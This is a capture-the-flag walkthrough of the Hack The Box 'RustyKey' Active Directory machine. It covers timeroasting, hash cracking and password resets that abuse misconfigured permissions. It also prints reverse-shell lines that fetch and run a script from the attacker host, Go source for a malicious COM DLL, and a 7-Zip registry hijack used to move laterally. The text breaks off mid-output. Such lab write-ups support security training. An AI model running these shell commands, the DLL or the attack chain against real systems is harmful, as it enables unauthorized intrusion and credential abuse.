# RustyKey

## Recon

::: info :information_source: Machine Information
As is common in real life Windows pentests, you will start the **RustyKey** box with credentials for the following account: `rr.parker / 8#t5HE8L!W3A`
:::

::: details nmap_scan.log
```log
Open 10.10.11.75:53
Open 10.10.11.75:88
Open 10.10.11.75:135
Open 10.10.11.75:139
Open 10.10.11.75:389
Open 10.10.11.75:445
Open 10.10.11.75:464
Open 10.10.11.75:593
Open 10.10.11.75:3268
Open 10.10.11.75:9389
Open 10.10.11.75:5985
Open 10.10.11.75:47001
Open 10.10.11.75:49664
Open 10.10.11.75:49665
Open 10.10.11.75:49666
Open 10.10.11.75:49667
Open 10.10.11.75:49671
Open 10.10.11.75:49674
Open 10.10.11.75:49675
Open 10.10.11.75:49677
Open 10.10.11.75:49678
Open 10.10.11.75:49681
Open 10.10.11.75:49696
Open 10.10.11.75:49725
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.10.11.75

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-07-24 00:04:09Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack Microsoft Windows RPC
49678/tcp open  msrpc         syn-ack Microsoft Windows RPC
49681/tcp open  msrpc         syn-ack Microsoft Windows RPC
49696/tcp open  msrpc         syn-ack Microsoft Windows RPC
49725/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-07-24T00:05:14
|_  start_date: N/A
|_clock-skew: 8h00m00s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 51928/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 6415/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 63867/udp): CLEAN (Failed to receive data)
|   Check 4 (port 11967/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```
:::

## DNS

```bash
â””â”€$ dig ANY rustykey.htb @10.10.11.75 | grep -vE ';|^$'
rustykey.htb.           600     IN      A       10.10.11.75
rustykey.htb.           3600    IN      NS      dc.rustykey.htb.
rustykey.htb.           3600    IN      SOA     dc.rustykey.htb. hostmaster.rustykey.htb. 67 900 600 86400 3600
dc.rustykey.htb.        3600    IN      A       10.10.11.75
```

```bash
â””â”€$ dnsrecon -d rustykey.htb -n 10.10.11.75 --tcp
[*] std: Performing General Enumeration against: rustykey.htb...
[-] DNSSEC is not configured for rustykey.htb
[*]      SOA dc.rustykey.htb 10.10.11.75
[*]      NS dc.rustykey.htb 10.10.11.75
[*]      A rustykey.htb 10.10.11.75
[*] Enumerating SRV Records
[+]      SRV _gc._tcp.rustykey.htb dc.rustykey.htb 10.10.11.75 3268
[+]      SRV _kerberos._tcp.rustykey.htb dc.rustykey.htb 10.10.11.75 88
[+]      SRV _kerberos._udp.rustykey.htb dc.rustykey.htb 10.10.11.75 88
[+]      SRV _ldap._tcp.rustykey.htb dc.rustykey.htb 10.10.11.75 389
[+]      SRV _ldap._tcp.ForestDNSZones.rustykey.htb dc.rustykey.htb 10.10.11.75 389
[+]      SRV _ldap._tcp.dc._msdcs.rustykey.htb dc.rustykey.htb 10.10.11.75 389
[+]      SRV _ldap._tcp.pdc._msdcs.rustykey.htb dc.rustykey.htb 10.10.11.75 389
[+]      SRV _ldap._tcp.gc._msdcs.rustykey.htb dc.rustykey.htb 10.10.11.75 3268
[+]      SRV _kpasswd._tcp.rustykey.htb dc.rustykey.htb 10.10.11.75 464
[+]      SRV _kerberos._tcp.dc._msdcs.rustykey.htb dc.rustykey.htb 10.10.11.75 88
[+]      SRV _kpasswd._udp.rustykey.htb dc.rustykey.htb 10.10.11.75 464
[+] 11 Records Found
```

## General Enum

```bash
â””â”€$ cicada-mastertul -q -u 'rr.parker' -p '8#t5HE8L!W3A' -t 10.10.11.75 -d dc.rustykey.htb -k --full
----------------HAPPY HAUNTING!!----------------
Target IP: 10.10.11.75
Domain: dc.rustykey.htb
Username: rr.parker
Password: 8#t5HE8L!W3A

Full Mode Enabled
------------------------------------------------
[!] Enumerating SMB...
[~] Commnad: faketime -f +8h netexec smb dc.rustykey.htb --timeout 99 -u 'rr.parker' -p '8#t5HE8L!W3A' --shares -k
[+] SMB share drive names saved to /home/woyag/Desktop/Rooms/RustyKey/mastertool/10.10.11.75/smb_results/share_names.txt
[+] SMB share drives list saved to /home/woyag/Desktop/Rooms/RustyKey/mastertool/10.10.11.75/smb_results/share_drives.txt
[*] Downloading SMB share files to /home/woyag/Desktop/Rooms/RustyKey/mastertool/10.10.11.75/smb_results
[~] Commnad: faketime -f +8h netexec smb dc.rustykey.htb --timeout 99 -u 'rr.parker' -p '8#t5HE8L!W3A' -M spider_plus -o DOWNLOAD_FLAG=True -k
[!] Connecting to WinRM...
[~] Commnad: faketime -f +8h netexec winrm dc.rustykey.htb --timeout 99 -u 'rr.parker' -p '8#t5HE8L!W3A'  -k
[-] Could not connect to WinRM
[!] Enumerating users with netexec rib bruteforce (up to 5000)...
[~] Commnad: faketime -f +8h netexec smb dc.rustykey.htb --timeout 99 -u 'rr.parker' -p '8#t5HE8L!W3A' --rid-brute 5000 -k
[+] Lookupsids saved to /home/woyag/Desktop/Rooms/RustyKey/mastertool/10.10.11.75/lookupsid_results/lookupsid.txt
[+] Users list saved to /home/woyag/Desktop/Rooms/RustyKey/mastertool/10.10.11.75/lookupsid_results/users.txt
[!] Enumerating NPUsers using impacket...
[~] Commnad: faketime -f +8h impacket-GetNPUsers 'rustykey.htb'/'rr.parker':'8#t5HE8L!W3A'@'10.10.11.75'  -usersfile /home/woyag/Desktop/Rooms/RustyKey/mastertool/10.10.11.75/lookupsid_results/users.txt
[-] No NPUsers found
[!] Enumerating UserSPNs using impacket...
[~] Commnad: faketime -f +8h impacket-GetUserSPNs 'rustykey.htb'/'rr.parker':'8#t5HE8L!W3A'@'10.10.11.75'  -request -dc-host dc.rustykey.htb -k
[-] No UserSPNs found
[!] Collecting Bloodhound Files...
[~] Commnad: faketime -f +8h bloodhound-python -d rustykey.htb -u 'rr.parker' -ns 10.10.11.75 -c all --dns-timeout 100 --zip -op rr.parker -p '8#t5HE8L!W3A'
[+] Bloodhound saved to /home/woyag/Desktop/Rooms/RustyKey/mastertool/10.10.11.75/bloodhound_results
[!] Enumerating LDAP...
[~] Commnad: faketime -f +8h netexec ldap dc.rustykey.htb --timeout 99 -u 'rr.parker' -p '8#t5HE8L!W3A' --query "(objectclass=*)" "" -k
[+] LDAP saved to /home/woyag/Desktop/Rooms/RustyKey/mastertool/10.10.11.75/ldap_results/results.txt
[+] LDAP saved to /home/woyag/Desktop/Rooms/RustyKey/mastertool/10.10.11.75/ldap_results/results.html
[!x!] Cleaning up...
```

Alongside user's there are bunch of computer accounts, which is a bit odd.
```bash
â””â”€$ cat mastertool/10.10.11.75/lookupsid_results/users.txt
Administrator
Guest
krbtgt
DC$
Support-Computer1$
Support-Computer2$
Support-Computer3$
Support-Computer4$
Support-Computer5$
Finance-Computer1$
Finance-Computer2$
Finance-Computer3$
Finance-Computer4$
Finance-Computer5$
IT-Computer1$
IT-Computer2$
IT-Computer3$
IT-Computer4$
IT-Computer5$
rr.parker
mm.turner
bb.morgan
gg.anderson
dd.ali
ee.reed
nn.marcos
backupadmin
```

There are no entrypoint, current user doesn't have much permissions/privileges, no kerberoastable users, but can we "roast" machine accounts?

`IT-Computer3` is definitely pivot target

![Writeup.png](/assets/pentest/htb/rustykey/Writeup.png)

## Timeroasting

This attack allows an attacker on the network to request a hashed & salted version of **any** computer account NT hash in the domain **without** the need for authentication.

- [Timeroasting: Attacking Trust Accounts in Active Directory](https://cybersecurity.bureauveritas.com/blog/timeroasting-attacking-trust-accounts-in-active-directory)
	- [Timeroasting, Trustroasting and Computer Spraying](https://cybersecurity.bureauveritas.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf) Whitepaper
	- [Timeroast](https://github.com/SecuraBV/Timeroast) Tool
- [Internal All The Things: Roasting - Timeroasting](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-roasting-timeroasting/)
- [ðŸ§ˆ v1.4.0 - SmoothOperator: Timeroasting the Domain](https://www.netexec.wiki/news/v1.4.0-smoothoperator?q=timeroasting#timeroasting-the-domain)

```bash
â””â”€$ faketime -f +8h netexec smb dc.rustykey.htb --timeout 99 -u 'rr.parker' -p '8#t5HE8L!W3A' -k -M timeroast
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A
TIMEROAST   dc.rustykey.htb 445    dc               [*] Starting Timeroasting...
TIMEROAST   dc.rustykey.htb 445    dc               1000:$sntp-ms$5707749f755091f26f32f8b0e49abda2$1c0111e900000000000a40de4c4f434cec333684c6cf5614e1b8428bffbfcd0aec338c0a6aa64727ec338c0a6aa67118
TIMEROAST   dc.rustykey.htb 445    dc               1103:$sntp-ms$d9096852029856353b1c78fd89e143b3$1c0111e900000000000a40df4c4f434cec333684c8aa44e2e1b8428bffbfcd0aec338c0b44918ad7ec338c0b4491cdf3
TIMEROAST   dc.rustykey.htb 445    dc               1104:$sntp-ms$ff055dccc62ca56b6074a21abe66efb4$1c0111e900000000000a40df4c4f434cec333684c6611e28e1b8428bffbfcd0aec338c0b4660fc9aec338c0b46613aad
TIMEROAST   dc.rustykey.htb 445    dc               1105:$sntp-ms$42202493e25e3e9ad108c9ec3f8ad574$1c0111e900000000000a40df4c4f434cec333684c7cf411be1b8428bffbfcd0aec338c0b47cf18d7ec338c0b47cf553d
TIMEROAST   dc.rustykey.htb 445    dc               1106:$sntp-ms$f9b0bce7f7b4da2cc97121a9a04cf846$1c0111e900000000000a40df4c4f434cec333684c994b0fce1b8428bffbfcd0aec338c0b499483b0ec338c0b4994cd81
TIMEROAST   dc.rustykey.htb 445    dc               1107:$sntp-ms$08b09a4fb6e0e8dcf5c54d6ac457f459$1c0111e900000000000a40df4c4f434cec333684c7991bc5e1b8428bffbfcd0aec338c0b4b6ffdbeec338c0b4b703d7f
TIMEROAST   dc.rustykey.htb 445    dc               1118:$sntp-ms$8164f16f8b2b7ee57f6e6248e05418d9$1c0111e900000000000a40df4c4f434cec333684c9e56e84e1b8428bffbfcd0aec338c0b5ddd20d7ec338c0b5ddd4e24
TIMEROAST   dc.rustykey.htb 445    dc               1119:$sntp-ms$14761586c41d0d1ded8e7b06c1f6ad8f$1c0111e900000000000a40df4c4f434cec333684c8d67c78e1b8428bffbfcd0aec338c0b60e6b830ec338c0b60e6f496
TIMEROAST   dc.rustykey.htb 445    dc               1120:$sntp-ms$9dff8df65223bf66821cdc261549bc26$1c0111e900000000000a40df4c4f434cec333684c6c50705e1b8428bffbfcd0aec338c0b62ac570bec338c0b62ac8605
TIMEROAST   dc.rustykey.htb 445    dc               1121:$sntp-ms$092cf22a3981bce6fbc57938f6340fbe$1c0111e900000000000a40df4c4f434cec333684c891303ee1b8428bffbfcd0aec338c0b64787ce9ec338c0b6478af3e
TIMEROAST   dc.rustykey.htb 445    dc               1122:$sntp-ms$eb4661a7be813a75608565991a83aeb1$1c0111e900000000000a40df4c4f434cec333684c64fd2a6e1b8428bffbfcd0aec338c0b664fb97bec338c0b664fe1bf
TIMEROAST   dc.rustykey.htb 445    dc               1123:$sntp-ms$bc739636af92069206bafb76f8f2b48c$1c0111e900000000000a40df4c4f434cec333684c856ad8be1b8428bffbfcd0aec338c0b68569106ec338c0b6856be52
TIMEROAST   dc.rustykey.htb 445    dc               1124:$sntp-ms$07d5c7cd3d7515d7bd2bd8c9fa031796$1c0111e900000000000a40df4c4f434cec333684ca1c135be1b8428bffbfcd0aec338c0b6a1bf6d6ec338c0b6a1c25d0
TIMEROAST   dc.rustykey.htb 445    dc               1125:$sntp-ms$61614127040718fad0b35b0acb02a02a$1c0111e900000000000a40df4c4f434cec333684c80dde0fe1b8428bffbfcd0aec338c0b6be4c86cec338c0b6be4f913
TIMEROAST   dc.rustykey.htb 445    dc               1126:$sntp-ms$1e6e9f68d12dbbd27770d48771d55a3d$1c0111e900000000000a40df4c4f434cec333684c9e1239be1b8428bffbfcd0aec338c0b6db81153ec338c0b6db83ea0
TIMEROAST   dc.rustykey.htb 445    dc               1127:$sntp-ms$1dc92a71b7df22e80d8a9c49d58ff732$1c0111e900000000000a40df4c4f434cec333684c7925354e1b8428bffbfcd0aec338c0b6f81d2d3ec338c0b6f8201cd
```

You'll need to either compile source by yourself or download Beta version of Hashcat ([https://hashcat.net/beta/](https://hashcat.net/beta/)) to crack these hashes.

```bash
âžœ .\hashcat.exe -a 0 -m 31300 C:\Users\Public\hashes.txt C:\Users\Public\rockyou.txt --user # -D 1
$sntp-ms$61614127040718fad0b35b0acb02a02a$1c0111e900000000000a40df4c4f434cec333684c80dde0fe1b8428bffbfcd0aec338c0b6be4c86cec338c0b6be4f913:Rusty88!
```

::: tip :bulb: Creds
`IT-Computer3$:Rusty88!`
:::

```bash
â””â”€$ faketime -f +8h netexec smb dc.rustykey.htb --timeout 99 -u 'IT-Computer3$' -p 'Rusty88!' -k
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\IT-Computer3$:Rusty88!
```

## Helpdesk

Now we can **reset password** for: `ee.reed, dd.ali, bb.morgan, gg.anderson`, add members in **Protected Objects**. On `dd.ali` we have a GenericWrite.
```bash
â””â”€$ faketime -f +8h bloodyAD -u 'IT-Computer3$' -p 'Rusty88!' -d 'rustykey.htb' --host 'dc.rustykey.htb' --dc-ip 10.10.11.75 -k add groupMember 'Helpdesk' 'IT-Computer3$'
[+] IT-Computer3$ added to Helpdesk
```

3 users can use WinRM

![Writeup-1.png](/assets/pentest/htb/rustykey/Writeup-1.png)

```bash
â””â”€$ faketime -f +8h bloodyAD -u 'IT-Computer3$' -p 'Rusty88!' -d 'rustykey.htb' --host 'dc.rustykey.htb' --dc-ip 10.10.11.75 -k set password 'bb.morgan' 'Password123$'
[+] Password changed successfully!

â””â”€$ faketime -f +8h bloodyAD -u 'IT-Computer3$' -p 'Rusty88!' -d 'rustykey.htb' --host 'dc.rustykey.htb' --dc-ip 10.10.11.75 -k set password 'gg.anderson' 'Password123$'
[+] Password changed successfully!

â””â”€$ faketime -f +8h bloodyAD -u 'IT-Computer3$' -p 'Rusty88!' -d 'rustykey.htb' --host 'dc.rustykey.htb' --dc-ip 10.10.11.75 -k set password 'ee.reed' 'Password123$'
[+] Password changed successfully!

â””â”€$ faketime -f +8h netexec smb dc.rustykey.htb -u 'bb.morgan' -p 'Password123$' -k
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\bb.morgan:Password123$ KDC_ERR_ETYPE_NOSUPP

â””â”€$ faketime -f +8h netexec smb dc.rustykey.htb -u 'gg.anderson' -p 'Password123$' -k
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\gg.anderson:Password123$ KDC_ERR_CLIENT_REVOKED

â””â”€$ faketime -f +8h netexec smb dc.rustykey.htb -u 'ee.reed' -p 'Password123$' -k
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\ee.reed:Password123$ KDC_ERR_ETYPE_NOSUPP
```

`KDC_ERR_CLIENT_REVOKED` error means that user account is disabled. We don't have WRITE permissions so we can't do anything about this user as of now.
```bash
â””â”€$ faketime -f +8h bloodyAD -u 'IT-Computer3$' -p 'Rusty88!' -d 'rustykey.htb' --host 'dc.rustykey.htb' --dc-ip 10.10.11.75 -k get object gg.anderson --attr 'userAccountControl'

distinguishedName: CN=gg.anderson,OU=Users,OU=IT,DC=rustykey,DC=htb
userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
```

["Unsupported etype" error when accessing a resource in a trusted domain](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/unsupported-etype-error-accessing-trusted-domain)

This problem occurs when you configure the child domain (or just the client) as follows:
- You disable the RC4_HMAC-MD5 encryption type, leaving the AES128-CTS-HMAC-SHA1-96 and AES256-CTS-HMAC-SHA1-96 encryption types enabled.
- You disable NTLM authentication.

Hmmmmmm... wot

## Protected Users

Update bloodhound data from `IT-Computer3$`
```bash
â””â”€$ faketime -f +8h bloodhound-python -u 'IT-Computer3$' -p 'Rusty88!' -ns 10.10.11.75 -d rustykey.htb -k -c All --zip -op it_comp3
```

Previously we couldn't see this link, but now it makes sense.

![Writeup-2.png](/assets/pentest/htb/rustykey/Writeup-2.png)

```bash
â””â”€$ faketime -f +8h bloodyAD -u 'IT-Computer3$' -p 'Rusty88!' -d 'rustykey.htb' --host 'dc.rustykey.htb' --dc-ip 10.10.11.75 -k add groupMember 'Helpdesk' 'IT-Computer3$'
[+] IT-Computer3$ added to Helpdesk

â””â”€$ faketime -f +8h bloodyAD -u 'IT-Computer3$' -p 'Rusty88!' -d 'rustykey.htb' --host 'dc.rustykey.htb' --dc-ip 10.10.11.75 -k remove groupMember 'Protected Objects' 'IT'
[-] IT removed from Protected Objects

â””â”€$ faketime -f +8h bloodyAD -u 'IT-Computer3$' -p 'Rusty88!' -d 'rustykey.htb' --host 'dc.rustykey.htb' --dc-ip 10.10.11.75 -k set password 'bb.morgan' 'Password123$'
[+] Password changed successfully!

â””â”€$ faketime -f +8h netexec smb dc.rustykey.htb -u 'bb.morgan' -p 'Password123$' -k --generate-tgt morgan
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\bb.morgan:Password123$
SMB         dc.rustykey.htb 445    dc               [+] TGT saved to: morgan.ccache
SMB         dc.rustykey.htb 445    dc               [+] Run the following command to use the TGT: export KRB5CCNAME=morgan.ccache
```

Success, we are no longer part of IT, however we can login.

## WinRM (bb.morgan)

```powershell
â””â”€$ export KRB5CCNAME=morgan.ccache
â””â”€$ faketime -f +8h evil-winrm -i dc.rustykey.htb -r rustykey.htb
User Name          SID
================== =============================================
rustykey\bb.morgan S-1-5-21-3316070415-896458127-4139322052-1139

Group Name                                  Type             SID                                           Attributes
=========================================== ================ ============================================= ==================================================
Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
RUSTYKEY\IT                                 Group            S-1-5-21-3316070415-896458127-4139322052-1131 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

### User.txt

```powershell
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> cat ../Desktop/user.txt
f2ffaf1b1ba346ecb01e2816dd6f4479
```

## Privilege Escalation (ee.reed)

Upgrade to reverse shell, because `faketime + evilwinrm + kerbeors` is dogshit (and due to HTB resetting everything).
```bash
â””â”€$ cp /opt/scripts/shells/ConPtyShell/Invoke-ConPtyShell.ps1 .
â””â”€$ echo 'Invoke-ConPtyShell 10.10.14.37 4444' >> Invoke-ConPtyShell.ps1
â””â”€$ py -m http.server 80
---
â””â”€$ stty raw -echo; (stty size; cat) | nc -lvnp 4444
---
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> IEX(IWR http://10.10.14.37/Invoke-ConPtyShell.ps1 -UseBasicParsing)
```

```bash
PS C:\Users\bb.morgan> tree /f /a
C:.
+---Desktop
|       internal.pdf
|       user.txt
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
\---Videos
```

Get the PDF
```bash
â””â”€$ impacket-smbserver share . -smb2support
---
PS C:\Users\bb.morgan\Desktop> copy C:\Users\bb.morgan\Desktop\internal.pdf \\10.10.14.37\share\
```

![Writeup-3.png](/assets/pentest/htb/rustykey/Writeup-3.png)

**BB Morgan (IT)** says:
- They've temporarily granted **extended access** to support staff for testing a **file archiving tool** (probably something like 7-Zip, WinRAR, etc.).
- The change affects **shared workstations**, especially used by Finance and IT.
- This temporary access includes **registry-level adjustments**, likely to enable right-click shell menu actions (context menu).
- They warn to not make unrelated system changes.
- The elevated permissions are **logged** and will be **rolled back** later.
- DevOps should be contacted for any issues.

We can reset password for `ee.reed` so we can pivot to him.

![Writeup-4.png](/assets/pentest/htb/rustykey/Writeup-4.png)

```bash
â””â”€$ faketime -f +8h bloodyAD -u 'IT-Computer3$' -p 'Rusty88!' -d 'rustykey.htb' --host 'dc.rustykey.htb' --dc-ip 10.10.11.75 -k set password 'ee.reed' 'Password123$'
[+] Password changed successfully!

â””â”€$ faketime -f +8h bloodyAD -u 'IT-Computer3$' -p 'Rusty88!' -d 'rustykey.htb' --host 'dc.rustykey.htb' --dc-ip 10.10.11.75 -k remove groupMember 'Protected Objects' 'Support'
[-] Support removed from Protected Objects
---
â””â”€$ stty raw -echo; (stty size; cat) | nc -lvnp 4444
---
PS C:\Users\bb.morgan\Music> .\RunasCs.exe 'ee.reed' 'Password123$' 'powershell -c IEX(IWR http://10.10.14.37/Invoke-ConPtyShell.ps1 -UseBasicParsing)'
[*] Warning: User profile directory for user ee.reed does not exists. Use --force-profile if you want to force the creation.
[*] Warning: The logon for user 'ee.reed' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
---
PS C:\Users> Set-PSReadLineOption -HistorySaveStyle SaveNothing # Avoid red screen
```

Ok we are in.
```bash
PS C:\Users> whoami /all
User Name        SID
================ =============================================
rustykey\ee.reed S-1-5-21-3316070415-896458127-4139322052-1145

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Group used for deny only
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
RUSTYKEY\Support                           Group            S-1-5-21-3316070415-896458127-4139322052-1132 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

## Privilege Escalation (mm.turner)

From PDF we know that we can edit registry keys related to archiving tool.

The archiving tool is **7-Zip**
```bash
PS C:\Users> ls '/Program Files'
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/26/2024   8:24 PM                7-Zip
d-----       12/26/2024   4:28 PM                Common Files
d-----        6/24/2025   9:59 AM                internet explorer
d-----        7/24/2025   1:09 AM                VMware
d-r---        5/30/2025   3:02 PM                Windows Defender
d-----        6/24/2025   9:59 AM                Windows Defender Advanced Threat Protection
d-----        11/5/2022  12:03 PM                Windows Mail
d-----         6/5/2025   7:54 AM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----        11/5/2022  12:03 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                Windows Security
d-----        9/15/2018  12:19 AM                WindowsPowerShell
```

[(ARTICLE) Restore old Right-click Context menu in Windows 11](https://learn.microsoft.com/en-us/answers/questions/2287432/(article)-restore-old-right-click-context-menu-in)

What we can probably edit is this for privilege escalation (7-Zip CLSID)

![Writeup-5.png](/assets/pentest/htb/rustykey/Writeup-5.png)

::: info :information_source: Note
Above image is from **my** Host Machine.
:::

### DLL Hijack via Registry

```bash
PS C:\Users> ls 'HKLM:\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}'

    Hive: HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}

Name                           Property
----                           --------
InprocServer32                 (default)      : C:\Program Files\7-Zip\7-zip.dll
                               ThreadingModel : Apartment
```

First we need malicious binary to get connection back.
```go
package main

import "C"
import (
    "os/exec"
    "syscall"
    "unsafe"
)

//export DllCanUnloadNow
func DllCanUnloadNow() uintptr {
    return 1 // S_FALSE
}

//export DllGetClassObject
func DllGetClassObject(rclsid, riid, ppv uintptr) uintptr {
    go Run()
    return 0x80004001 // E_NOTIMPL
}

//export DllRegisterServer
func DllRegisterServer() uintptr {
    return 0 // S_OK
}

//export DllUnregisterServer
func DllUnregisterServer() uintptr {
    return 0 // S_OK
}

func Run() {
    cmd := exec.Command("powershell.exe", "-c", "IEX(IWR http://10.10.14.37/Invoke-ConPtyShell.ps1 -UseBasicParsing)")
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
    cmd.Start()
}

func main() {}
```

::: info :information_source: Note
After adding **Missing COM DLL Exports** the reverse shell worked \\o/
:::

Compile
```bash
env GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -ldflags="-s -w" -buildmode=c-shared -o rev.dll rev_dll.go
```

::: info :information_source: Note
Alternatively just use MSF
:::

```bash
PS C:\Users\Public\Music> curl.exe 10.10.14.37/rev.dll -O
PS C:\Users\Public\Music> Set-Item -Path 'HKLM:\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32' -Value 'C:\Users\Public\Music\rev.dll'
PS C:\Users\Public\Music> ls 'HKLM:\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}'
    Hive: HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}
Name                           Property
----                           --------
InprocServer32                 (default)      : C:\Users\Public\Music\rev.dll
                               ThreadingModel : Apartment
```

```bash
â””â”€$ stty raw -echo; (stty size; cat) | nc -lvnp 4444
listening on [any] 4444 ...
                           connect to [10.10.14.37] from (UNKNOWN) [10.10.11.75] 62509
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows> whoami /all
User Name          SID
================== =============================================
rustykey\mm.turner S-1-5-21-3316070415-896458127-4139322052-1138

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
